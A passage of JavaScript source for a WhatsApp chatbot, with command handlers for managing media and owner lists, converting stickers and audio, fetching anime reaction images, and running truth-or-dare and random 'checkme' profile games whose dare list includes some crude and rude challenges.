case 'addvideo':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the video name?')
if (VideoNano.includes(q)) return replynano("The name is already in use")
let delb = await LordVoltage.downloadAndSaveMediaMessage(quoted)
VideoNano.push(q)
await fsx.copy(delb, `./data/voltage/sparkmedia/video/${q}.mp4`)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(delb)
replynano(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}}
break
case 'delvideo':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the video name')
if (!VideoNano.includes(q)) return replynano("The name does not exist in the database")
let wanu = VideoNano.indexOf(q)
VideoNano.splice(wanu, 1)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(`./data/voltage/sparkmedia/video/${q}.mp4`)
replynano(`Success deleting video ${q}`)
}}
break
case 'listvideo':{if (prefix === '.') {
let teks = '┌──★「 *Video List* 」\n│\n'
for (let x of VideoNano) {
teks += `│† ${x}\n`
}
teks += `│\n└────────────★\n\n*Totally there are : ${VideoNano.length}*`
replynano(teks)
}}
break
case 'addimage':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the image name?')
if (ImageNano.includes(q)) return replynano("The name is already in use")
let delb = await LordVoltage.downloadAndSaveMediaMessage(quoted)
ImageNano.push(q)
await fsx.copy(delb, `./data/voltage/sparkmedia/image/${q}.jpg`)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(delb)
replynano(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}}
break
case 'delimage':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the image name')
if (!ImageNano.includes(q)) return replynano("The name does not exist in the database")
let wanu = ImageNano.indexOf(q)
ImageNano.splice(wanu, 1)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(`./data/voltage/sparkmedia/image/${q}.jpg`)
replynano(`Success deleting image ${q}`)
}}
break
case 'listimage':{if (prefix === '.') {
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNano.length}*`
replynano(teks)
}}
break
case 'addsticker':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the sticker name?')
if (NanoSticker.includes(q)) return replynano("The name is already in use")
let delb = await LordVoltage.downloadAndSaveMediaMessage(quoted)
NanoSticker.push(q)
await fsx.copy(delb, `./data/voltage/sparkmedia/sticker/${q}.webp`)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(delb)
replynano(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}}
break
case 'delsticker':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the sticker name')
if (!NanoSticker.includes(q)) return replynano("The name does not exist in the database")
let wanu = NanoSticker.indexOf(q)
NanoSticker.splice(wanu, 1)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(`./data/voltage/sparkmedia/sticker/${q}.webp`)
replynano(`Success deleting sticker ${q}`)
}}
break
case 'liststicker':{if (prefix === '.') {
let teks = '┌──★「 *Sticker List* 」\n│\n'
for (let x of NanoSticker) {
teks += `│† ${x}\n`
}
teks += `│\n└────────────★\n\n*Totally there are : ${NanoSticker.length}*`
replynano(teks)
}}
break
case 'addvn':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the audio name?')
if (NanoVoiceNote.includes(q)) return replynano("The name is already in use")
let delb = await LordVoltage.downloadAndSaveMediaMessage(quoted)
NanoVoiceNote.push(q)
await fsx.copy(delb, `./data/voltage/assets/audio/${q}.mp3`)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(delb)
replynano(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}}
break
case 'delvn':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the vn name')
if (!NanoVoiceNote.includes(q)) return replynano("The name does not exist in the database")
let wanu = NanoVoiceNote.indexOf(q)
NanoVoiceNote.splice(wanu, 1)
fs.writeFileSync('./data/voltage/sparkmedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(`./data/voltage/assets/audio/${q}.mp3`)
replynano(`Success deleting vn ${q}`)
}}
break
case 'listvn':{if (prefix === '.') {
let teks = '┌──★「 *VN List* 」\n│\n'
for (let x of NanoVoiceNote) {
teks += `│† ${x}\n`
}
teks += `│\n└────────────★\n\n*Totally there are : ${NanoVoiceNote.length}*`
replynano(teks)
}}
break
case 'addowner':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await LordVoltage.onWhatsApp(bnnd)
if (ceknye.length == 0) return replynano(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replynano(`Number ${bnnd} Has Become An Owner!!!`)}
break
case 'delowner':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} nomor\nExample ${prefix+command} 256xxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replynano(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)}
break
case 'listpremium': case 'listprem':if (prefix === '.') {
teks = '*Premium List*\n\n'
for (let LordVoltage of prem) {
teks += `- ${LordVoltage}\n`
}
teks += `\n*Total : ${prem.length}*`
LordVoltage.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })}
break
case 'setcmd': {if (prefix === '.') {
if (!m.quoted) return replynano('Reply Message!')
if (!m.quoted.fileSha256) return replynano('SHA256 Hash Missing')
if (!text) return replynano(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replynano('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replynano(`Done!`)
            }}
            break
case 'delcmd': {if (prefix === '.') {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replynano(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replynano('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replynano(`Done!`)
            }}
            break
case 'listcmd': {if (prefix === '.') {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
LordVoltage.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }}
            break 
case 'lockcmd': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!m.quoted) return replynano('Reply Message!')
if (!m.quoted.fileSha256) return replynano('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replynano('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replynano('Done!')
            }}
            break
case 'addmsg': {if (prefix === '.') {
if (!m.quoted) return replynano('Reply Message You Want To Save In Database')
if (!text) return replynano(`Example : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replynano(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replynano(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }}
            break
case 'getmsg': {if (prefix === '.') {
if (!text) return replynano(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replynano(`'${text}' not listed in the message list`)
LordVoltage.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }}
            break
case 'listmsg': {if (prefix === '.') {
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replynano(teks)
	    }}
	    break
	case 'delmsg': case 'deletemsg': {if (prefix === '.') {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replynano(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replynano(`Successfully deleted '${text}' from the message list`)
            }}
	    break
case 'setexif':
case 'setpackname': {if (prefix === '.') {
               if (!DanzTheCreator) return reply(mess.only.owner)
               if (!text) return replynano(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replynano(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }}
            break
case 'getbio':{if (prefix === '.') {
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await LordVoltage.fetchStatus(who)
    replynano(bio.status)
  } catch {
    if (text) return replynano(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await LordVoltage.fetchStatus(who)
      replynano(bio.status)
    } catch {
      return replynano(`bio is private or you haven't replied to the person's message!`)
    }
  }
}}
break
case 'setppbot': case 'setpp': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!quoted) return replynano(`Send/Reply to Images With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replynano(`Send/Reply to Images With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replynano(`Send/Reply to Images With Caption ${prefix + command}`)
var medis = await LordVoltage.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await LordVoltage.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replynano(`Success`)
} else {
var memeg = await LordVoltage.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replynano(`Success`)
}
}}
break
case 'creategc': case 'creategroup': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args.join(" ")) return replynano(`Use ${prefix+command} groupname`)
try {
let cret = await LordVoltage.groupCreate(args.join(" "), [])
let response = await LordVoltage.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
LordVoltage.sendMessage(m.chat, { text:teks, mentions: await LordVoltage.parseMention(teks)}, {quoted:m})
} catch {
replynano("Error!")
}
}}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {if (prefix === '.') {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
LordVoltage.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{if (prefix === '.') {
axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
LordVoltage.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}}
break
case 'tomp4': case 'tovideo': {if (prefix === '.') {
if (!quoted) return replynano('Reply to Sticker')
if (!/webp/.test(mime)) return replynano(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
let media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await LordVoltage.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
            }}
            break
             case 'toaud': case 'toaudio': {if (prefix === '.') {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replynano(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				 reply(mess.wait) 
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await LordVoltage.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}}
			break
            
            case 'tovn': case 'toptt': {if (prefix === '.') {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replynano(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replynano(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            LordVoltage.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }}
            break
            case 'togif': {if (prefix === '.') {
if (!quoted) return replynano('Reply video')
if (!/webp/.test(mime)) return replynano(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await LordVoltage.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }}
            break
            case 'toqr':{if (prefix === '.') {
  if (!q) return replynano(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await LordVoltage.sendMessage(from, { image: medi, caption:"Here he is!!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }}
  break
  case 'dare':if (prefix === '.') {
              const dare =[
"Eat 2 tablespoons of rice without any side dishes, if it feels heavy, you can drink.",
"Name the person who makes you speechless",
"Call your crush/girlfriend now and send a screenshot here",
"Send emotes only every time you type in a chat group/private chat for 1 day.",
"Say 'Welcome to Who Wants To Be a Millionaire!' to all the groups you have",
"Call your ex and say you miss him",
"sing the chorus of the last song you played",
"Record a voice for your ex/girlfriend, say 'Hi (name), want to call, wait a minute. I really miss you",
"Hit the table (at home) until you get scolded for being noisy",
"Tell a stranger I was just told that I was your first sibling, we separated, then I had plastic surgery and you love him/her",
"Mention your ex's name",
"make 1 rhyme for group members!",
"Send your WhatsApp conversation list",
"Chat with strangers in ghetto language then capture screen here",
"Tell your own version of embarrassing things",
"Tag someone you hate",
"Pretend to be affected, for example: affected by dogs, affected by grasshoppers, affected by refrigerators, etc.",
"Change the name to *I AM DONKEY* for 24 hours",
"Shout *ma chuda ma chuda ma chuda* in front of your house",
"Take a photo/portrait of your girlfriend or crush and send it here",
"Tell me the type of boyfriend you like!",
"Say *I have a crush on you, will you be my boyfriend?* to the opposite sex, the last time you talked to him (send it on WA/Telegram), wait until he replies, if so, give it here",
"Record your voice reading *titar ke age do titar, titar ke piche do titar*",
"Chat jokes with your ex and say *I love you, please come back.* without mentioning that it's a challenge!",
"Chat with WhatsApp contacts in order according to your phone's battery percentage, then say I'm lucky to have you!",
"Change you name to *I am a child of God* for 5 hours",
"Type in your native language for 24 hours",
"Use Ariana grande photo for 3 days",
"Send a song quote then tag members who match the quote",
"Send a voice message saying Can I call you darling?",
"Screenshot of the last conversation on your WhatsApp",
"Say *YOU ARE VERY BEAUTIFUL, DON'T LIE* to your same sex friends!",
"Call one of the group members and say something rude to them",
"Act like a chicken in front of your parents",
"Take a book at random and read a page aloud and record the voice and post it here",
"Open the front door of your house and bark like a wolf for 10 seconds",
"Take an embarrassing selfie and make it your profile photo",
"Let the group choose a word and a song that is known. You have to sing the song and send it as a voice message here",
"Walk supported with your elbows and knees as long as you can",
"sing the national anthem in voice messages",
"Do 30 seconds of breakdancing in the living room",
"Tell me a sad story that you know",
"Create a short twerk dance video and upload it as a status for 5 minutes",
"Eat a piece of raw garlic",
"Show the last five people you messaged and fill in their messages",
"Make your full name as status for 5 hours",
"Create a short, unfiltered dance video with just music and upload it as a status for 5 hours",
"Call your best friend, bullshit",
"Make a photo of yourself without a filter as a status for 10 minutes",
"Say 'I love Oli London' in a voice message 😄",
"Send your ex a message and tell him you still like him",
"Call your crush/girlfriend/friend now and screenshot here",
"Be rude to one of the group members in a private conversation and say you're ugly, a burden",
"Say YOU'RE BEAUTIFUL/HANDSOME to one of the people at the top of your pinlist or the first person in your conversation list",
"Send a voice message and say Can I call you Baby. If you are a man, say a woman's name. If you are a woman, say a man's name",
"Write I love you (the name of a random group member who is online) in a private conversation (if you are a man, write a woman's name; if you are a woman, write a man's name), take a screenshot and post it here",
"Use a Nollywood actor's photo as your profile photo for 3 days",
"Make your crush's photo a status with the caption 'This is my crush'",
"Change the name to *I AM GAY* for 5 hours",
"Chat with one of your contacts on WhatsApp and say I will be your girlfriend for 5 hours",
"Send a voice message and say I have a crush on you, will you be my girlfriend? to a random person from the group (if you're a girl, choose a boy's name; if you're a boy, choose a girl's name)",
"Spank your ass hard and send a slapping sound via voice message 😂",
"Name your girlfriend's type and send her photo here with the caption 'The ugliest woman/man in the world'",
"Shout 'bravooooooooo' and send it via voice message here",
"Take a photo of your face and post it here",
"Send a photo of yourself with the caption I'm a lesbian",
"Shout using harsh words and send via voice message",
"Scream you bastard in front of your mother or father",
"Change the name to *I'm stupid for 24 hours*",
"Hit yourself steadily and send the sound of the hit via voice message 😂",
"Say i love to fuck via voice message",
"Send a photo of your girlfriend or crush here",
"Create any TikTok dance challenge video and upload as status, you can delete it after 5 hours",
"Unfriending your best friend for 5 hours without telling him is a challenge",
"Tell one of your friends that you love him and want to marry him, without telling him that it is a challenge",
"Say I love my daddy via voice message",
"Write I feel horny and upload it as a status, you can only delete it after 5 hours",
"Write I'm a lesbian and upload it as a status, you can only delete it after 5 hours",
"Kiss your mom or dad and say I love you 😌",
"Make your father's name as status for 5 hours",
"Send harsh words in any group, except this group, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              LordVoltage.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})}
              break
        break
       case 'truth':if (prefix === '.') {
              const truth =[
"Have you ever liked someone? How long?",
    "If you could or if you wanted, which chat group or outside group would you like to be friends with? (can be different/same type)",
    "What is your biggest fear?",
    "Have you ever liked someone and felt that that person liked you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever taken money from your father or mother? The reason?",
    "What makes you happy when you're sad?",
    "Have you ever had feelings of one-way love? If yes, who? How did you feel, sɪʀ?",
    "Have you ever been someone's mistress?",
    "The most feared thing?",
    "Who is the most influential person in your life?",
    "What achievements have you achieved this year?",
    "Who is the person who can make you cool?",
    "Who is the person who has made you the most happy?",
    "Who is closest to your ideal partner type here?",
    "Who do you like to play with?",
    "Have you ever rejected someone? reasons why?",
    "Name an incident that hurt your feelings that you still remember",
    "What achievements have you achieved this year?",
    "Your worst habit at school?",
    "What song do you sing most often in the bathroom?",
    "Have you ever had a near death experience?",
    "When was the last time you were so angry? Why?",
    "Who was the last person to call you?",
    "Do you have any hidden talents? What are they?",
    "What word do you hate the most?",
    "What was the last YouTube video you watched?",
    "What was the last thing you googled?",
    "In this group, with whom would you like to exchange your life for a week?",
    "What is the scariest thing that has ever happened to you?",
    "Have you ever farted and blamed it on someone else?",
    "When was the last time you made someone else cry?",
    "Have you ever lost track of a friend?",
    "Have you ever seen a corpse?",
    "Which member of your family bothers you the most and why?",
    "If you had to delete one app from your phone, which app would you delete?",
    "What apps do you waste the most time on?",
    "Have you ever pretended to be sick to get home from school?",
    "What's the most embarrassing thing in your room?",
    "If you were stranded on a desert island, what five things would you take with you?",
    "Have you ever laughed so hard your pee was wet?",
    "Do you smell your own farts?",
    "Have you ever peed in bed while sleeping?",
    "What's the biggest mistake you've ever made?",
    "Have you ever cheated on an exam?",
    "What's the worst thing you've ever done?",
    "When was the last time you cried?",
    "Among your parents, who do you love the most?",
    "Do you sometimes put your fingers in your nostrils?",
    "Who was your crush when you were at school?",
    "Speaking honestly, do you like a boy in this group?",
    "Have you ever liked someone? How long?",
    "Do you have a boyfriend? What is your biggest fear?",
    "Have you ever liked someone and felt that that person liked you too?",
    "What is the name of your friend's ex-girlfriend that you secretly liked?",
    "Have you ever taken money from your mother or father? What is the reason?",
    "What makes you happy when you're sad?",
    "Do you like anyone in this group? If yes, who?",
    "Have you ever been cheated on by someone?",
    "Who is the most important person in your life?",
    "What achievements have you achieved this year?",
    "Who is the person who can make you happy when you are sad?",
    "Who is the person who has ever made you feel uncomfortable?",
    "Have you ever lied to your parents?",
    "Do you still like your ex-boyfriend?",
    "Who do you want to play with?",
    "Have you ever stolen something big? What was the reason?",
    "Name an incident that has hurt you and that you still remember?",
    "What achievements have you achieved this year?",
    "What was your worst habit at school?",
    "Do you love the creator of this bot, Dani 😄",
    "Have you ever thought about taking revenge on the teacher?",
    "Do you like the current prime minister of your country?",
    "Are you vegetarian or non-vegetarian?",
    "If you could become invisible, what would you do first?",
    "What secret do you keep from your parents?",
    "Who is your secret crush?",
    "Who was the last person you peeked at on social media?",
    "If a genie gave you three wishes, what would you ask for?",
    "What is your biggest regret?",
    "What kind of animal do you think is most similar to you?",
    "How many selfies do you take in a day?",
    "What was your favorite show from childhood?",
    "If you could be a fictional character in one day, who would you choose?",
    "Who do you text the most with?",
    "What's the biggest lie you've ever told your parents?",
    "Which celebrity is your idol?",
    "The strangest dream you have ever had?",
    "Do you play PUBG? If yes, please provide your ID number."
]
              const Nanotruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              LordVoltage.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Nanotruth }, {quoted:m})}
              break
case 'checkme':if (prefix === '.') {
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ["Nice", "Unfriendly", "Chapri", "Nibba/nibbi", "Annoying", "Broken", "Angry person", "Polite", "Burden", "Great", "Cringe", "Liar"]
					var hoby = ['Cooking', 'Dancing', 'Playing', 'Playing games', 'Painting', 'Helping Others', 'Watching anime', 'Reading', 'Cycling', 'Singing', 'Talking', 'Sharing Memes','Drawing','Spending Parents Money','Playing Truth or Dare','Spending Time Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes', 'No', 'Very ugly', 'Very handsome']
					var wetak= ['Caring', 'Generous', 'Angry people', 'Sorry', 'Submissive', 'Kind', 'Im sorry', 'Good hearted', 'Patient', 'UwU', 'Best', 'Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*characteristics :* ${sipat}
*Hobby :* ${biho}
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Coward :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
LordVoltage.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})}
break
case 'toimg': {if (prefix === '.') {
	reply(mess.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replynano(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await LordVoltage.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            LordVoltage.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replynano(`Please reply to non animated sticker`)
    }}
    break
case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {if (prefix === '.') {
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `VOLTAGE`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
